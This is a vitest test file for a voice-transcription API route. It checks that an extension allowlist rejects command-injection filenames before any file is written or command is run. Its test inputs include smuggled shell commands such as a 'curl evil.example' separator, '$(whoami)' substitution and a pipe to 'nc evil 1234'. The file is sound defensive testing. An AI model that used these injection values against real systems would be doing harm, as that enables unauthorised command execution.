import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

/**
 * Tests for `/api/voice/transcribe` — the extension-allowlist added in
 * the pre-v1.10.0 security-hardening PR.
 *
 * Coverage:
 *   - M-4: An uploaded file named `foo.mp3; curl evil.example` previously
 *     produced `ext = "mp3; curl evil.example"`, which landed in the tmp
 *     filename, which was then interpolated into a `/bin/bash` execSync
 *     template. The fix rejects any ext that isn't in the audio allowlist
 *     with 400 BEFORE writeFileSync or execFileSync runs.
 *   - Happy path: a well-formed `foo.mp3` upload reaches the execFileSync
 *     call with the tmp path as a single argv token.
 *
 * Strategy:
 *   - Mock `node:child_process` execFileSync so no actual transcribe binary
 *     runs. The spy returns a stub "hello world" transcript for happy-path
 *     assertions.
 *   - Mock `node:fs` writeFileSync / unlinkSync so the test doesn't litter
 *     the tmp dir. readFileSync is kept real for the secrets loader.
 *   - Mock `../db.js` so the DB import chain doesn't try to open a sqlite
 *     file. The /transcribe endpoint doesn't touch the DB directly, but its
 *     module imports it at top level.
 *   - Telegram auth middleware isn't attached to the raw route — the test
 *     sets c.set("telegramUser") via a thin wrapper Hono app that mounts
 *     voiceRoute and injects a fake user.
 */

// The shipping code switched from `execFileSync` (blocking, no timeout) to
// promisified `execFile` so the audio.transcribe span always ends (see
// phase-4 orch swarm M4). `util.promisify` without a custom symbol converts
// a node-style callback (err, value) into a Promise resolving to `value`.
// Our stub resolves with an `{stdout, stderr}` object so the awaiting code
// destructures `{ stdout }` correctly.
//
// The mock module replaces `execFile` entirely (no promisify.custom), which
// forces `promisify` down its default path — our spy's callback delivers
// `{stdout, stderr}` as the single value arg.
const execFileSpy = vi.fn((
  _bin: string,
  _args: string[],
  optsOrCb: unknown,
  maybeCb?: (err: Error | null, value: { stdout: string; stderr: string }) => void,
) => {
  const cb =
    typeof optsOrCb === "function"
      ? (optsOrCb as (err: Error | null, value: { stdout: string; stderr: string }) => void)
      : maybeCb;
  cb?.(null, { stdout: "hello world\n", stderr: "" });
  return { kill: vi.fn() } as unknown as import("node:child_process").ChildProcess;
});
const writeFileSpy = vi.fn((_path: string, _data: any) => {});
const unlinkSpy = vi.fn((_path: string) => {});

vi.mock("node:child_process", async () => {
  const actual = await vi.importActual<typeof import("node:child_process")>("node:child_process");
  return {
    ...actual,
    execFile: execFileSpy,
  };
});

vi.mock("node:fs", async () => {
  const actual = await vi.importActual<typeof import("node:fs")>("node:fs");
  return {
    ...actual,
    writeFileSync: writeFileSpy,
    unlinkSync: unlinkSpy,
    // keep readFileSync real — voice.ts's loadOpenAIEnv uses it against a
    // real file that may or may not exist; the catch in loadOpenAIEnv
    // absorbs a missing secrets file.
  };
});

// Stub out the DB module so the transcripts CRUD routes' top-level import
// chain doesn't try to open a real sqlite file during test setup.
vi.mock("../../db.js", () => {
  const fakeStmt = {
    run: vi.fn(),
    get: vi.fn(() => null),
    all: vi.fn(() => []),
  };
  return {
    db: {
      prepare: vi.fn(() => fakeStmt),
    },
  };
});

const { voiceRoute } = await import("../voice.js");
const { Hono } = await import("hono");

// Wrap voiceRoute in a parent app that sets a fake telegram user so the
// auth check inside /transcribe passes. The real middleware lives in
// middleware.ts; we bypass it by injecting c.set before mounting.
const app = new Hono();
app.use("*", async (c, next) => {
  c.set("telegramUser", { id: 12345, username: "test" } as any);
  await next();
});
app.route("/api/voice", voiceRoute);

beforeEach(() => {
  execFileSpy.mockClear();
  writeFileSpy.mockClear();
  unlinkSpy.mockClear();
});

afterEach(() => {
  vi.clearAllMocks();
});

async function postTranscribe(filename: string, content = "fake-audio-bytes") {
  const fd = new FormData();
  fd.set("audio", new File([content], filename, { type: "audio/mp3" }));
  const res = await app.request("/api/voice/transcribe", {
    method: "POST",
    body: fd,
  });
  const json = (await res.json()) as { text?: string; error?: string };
  return { status: res.status, body: json };
}

describe("/transcribe extension allowlist (M-4)", () => {
  it("rejects a filename with a shell command separator in the extension", async () => {
    const { status, body } = await postTranscribe("audio.mp3; curl evil.example");
    expect(status).toBe(400);
    expect(body.error).toMatch(/unsupported audio extension/);
    // The rejection must happen BEFORE writeFileSync (no tmp file created)
    // and BEFORE execFileSync (no transcribe invocation).
    expect(writeFileSpy).not.toHaveBeenCalled();
    expect(execFileSpy).not.toHaveBeenCalled();
  });

  it("rejects a filename whose extension contains command substitution", async () => {
    const { status, body } = await postTranscribe("audio.$(whoami)");
    expect(status).toBe(400);
    expect(body.error).toMatch(/unsupported audio extension/);
    expect(execFileSpy).not.toHaveBeenCalled();
  });

  it("rejects a completely unknown extension like .exe", async () => {
    const { status, body } = await postTranscribe("malware.exe");
    expect(status).toBe(400);
    expect(body.error).toMatch(/unsupported audio extension/);
    expect(execFileSpy).not.toHaveBeenCalled();
  });

  it("rejects a filename whose extension is a pipe to another command", async () => {
    const { status } = await postTranscribe("audio.mp3|nc evil 1234");
    expect(status).toBe(400);
    expect(execFileSpy).not.toHaveBeenCalled();
  });

  it("accepts a .mp3 upload and calls execFile with an argv array", async () => {
    const { status, body } = await postTranscribe("song.mp3");
    expect(status).toBe(200);
    expect(body.text).toBe("hello world");
    expect(execFileSpy).toHaveBeenCalledTimes(1);
    const [bin, args] = execFileSpy.mock.calls[0];
    expect(bin).toMatch(/bin\/transcribe$/);
    // Second arg is the argv array — a single element (the tmp path).
    expect(Array.isArray(args)).toBe(true);
    expect(args).toHaveLength(1);
    expect(args[0]).toMatch(/cpc-audio-.*\.mp3$/);
  });

  it("accepts .wav, .ogg, .webm, .m4a, .flac, .opus, .oga, .mp4, .aac uploads", async () => {
    // Pared-down coverage of the allowlist — one per token.
    const exts = ["wav", "ogg", "webm", "m4a", "flac", "opus", "oga", "mp4", "aac"];
    for (const ext of exts) {
      execFileSpy.mockClear();
      const { status } = await postTranscribe(`clip.${ext}`);
      expect(status, `ext=${ext}`).toBe(200);
      expect(execFileSpy, `ext=${ext}`).toHaveBeenCalledTimes(1);
    }
  });

  it("is case-insensitive about the extension (MP3 → mp3)", async () => {
    const { status } = await postTranscribe("SHOUTING.MP3");
    expect(status).toBe(200);
  });
});
